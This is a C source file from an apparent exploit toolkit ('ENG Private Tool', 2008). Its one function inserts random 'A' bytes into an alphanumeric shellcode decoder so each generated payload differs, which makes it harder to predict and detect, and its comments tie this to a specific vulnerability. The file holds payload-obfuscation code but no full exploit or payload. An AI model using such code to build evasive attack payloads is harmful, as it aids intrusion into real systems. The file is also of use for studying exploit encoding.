/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef RANDNOPS__C_
#define RANDNOPS__C_ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: randnops.c,v 1.1 2008-09-12 13:23:20-03 nbrito Exp $ */
#include "common.h" 

/* Random nops processing routine.
   Returns the random nops to be used by alpha2(). */
const u_int8_t * process_nops(u_int8_t * buffer, register u_int32_t length){
	u_int8_t * tmp;              /* temporary buffer */
	register   u_int32_t a = 0, b = 0, c = 0, d = (length - 3), e;
	u_int32_t  pst[d];
	struct     timeval  seed;

	/* Using microseconds as seed. */
	gettimeofday(&seed, (struct timezone *)0);
	srand((unsigned) seed.tv_usec);

	/* XXX Here is some gotchas XXX
	   (1) Basicaly it gets the length of the first piece of the decoder
	       and caculate how many fields it can inject.
	   (2) With the knowledge of how many fields it can inject, it gets
	       a random number of fields to inject, making hard to predict
	       how many bytes will be injected next time it runs. 
	   (3) For this vulnerability it has to sanitize the length of the
	       payload, so it uses a magic number (24 bytes) and the 5th
	       part of the decoder length. */
	e = 1 + (u_int32_t) ((float) d * rand() / (RAND_MAX + 1.0));
	
	if((length > __MAGIC_NUMBER__) && (e > ((length / 5) * 2)))
		e = (length / 5);

	tmp = (u_int8_t *) malloc (length + e + 1); 

redo:   /* That is the REDO point. :-) */
	while(a < e){
		b = (u_int32_t) ((float) d * rand() / (RAND_MAX + 1.0));
		
		/* XXX Here is some gotchas XXX
		   (1) The positions will be injected randomly, and it cannot
		       use the same pst twice, or ven more than that.
		   (2) It stores all the positions in the positions, a int matrix,
		       and than checks if the pst is already used. If so, it
		       redo the procedure. YES!!! A GOTO!!! :-D */
		for(c = 0 ; c < a ; c++)
			if(pst[c] == b)
				/* Some people said this is awful, horrible, terrrible,
				   extremely bad.

				   But, you know what?
				   It works very fine, and I don't fear the goto! :) */
				goto redo;

		pst[a] = b;
		a++;
	}

	/* Injecting the 'A' in the decoder. It does not replace the
	   decoder bytes, it injects new bytes. In this vulnerability
	   the only byte allowed is 'A', and that is ok, because it uses
	   a Alpha-number encoder. */
	for(a = 0, b = 0 ; a <  length ; ){
		for(c = 0 ; c < e ; c++)
			if(pst[c] == a)
				tmp[a + b++] = 'A';

		tmp[b + a++] = buffer[a];
	}

	tmp[a + b] = '\0';

	return(tmp);
}
#endif  /* RANDNOPS__C_ */
